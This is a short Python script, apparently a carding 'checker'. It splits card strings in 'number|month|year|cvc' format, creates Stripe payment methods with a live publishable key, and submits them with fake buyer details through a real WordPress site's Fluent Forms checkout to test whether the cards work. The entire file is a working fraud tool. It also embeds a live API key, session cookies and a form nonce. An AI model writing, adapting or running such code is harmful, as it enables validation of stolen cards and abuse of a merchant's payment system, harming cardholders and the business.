import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not/A)Brand";v="24", "Chromium";v="137", "Google Chrome";v="137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51MwTfpLLN73ltKGid1hJNDJwQ6r84ndDcBHnmLRJJViMy2OrAnevFqffK9ciyhFQahUqO3uyfaZg4ENsKvenFdLv00a9sDz7vX'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
	    '__stripe_mid': '83d13546-a608-4526-bc41-7e56c41b5b94beb154',
    '__stripe_sid': '4d6a27fb-a404-4ef1-96be-33bd70e5b635ae124b',
	}
	
	headers = {
	    'authority': 'www.kraftingclub.com',
    'accept': '*/*',
    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=c6ad0289-66f1-4f54-ae64-4f264cdfc16f020b73; __stripe_sid=5b31b41c-df70-4a95-a15a-f68c5a85e354c978ad; leadmagnetpopup=true',
    'origin': 'https://www.kraftingclub.com',
    'referer': 'https://www.kraftingclub.com/both-memberships/',
    'sec-ch-ua': '"Not/A)Brand";v="24", "Chromium";v="137", "Google Chrome";v="137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1759465007237',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=51650&_fluentform_18_fluentformnonce=caf1b8ac7b&_wp_http_referer=/both-memberships/&names[first_name]=Benni&names[last_name]=Ent&email=gtwo578@gmail.com&phone=12054428910&address_1[address_line_1]=17 Allen street&address_1[address_line_2]=&address_1[city]=New York&address_1[state]=New York&address_1[zip]=10080&address_1[country]=US&payment-coupon=&payment_input=0&payment_method=stripe&__ff_all_applied_coupons=&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '18',
	}
	
	r2 = requests.post(
	    'https://www.kraftingclub.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	return (r2.json())
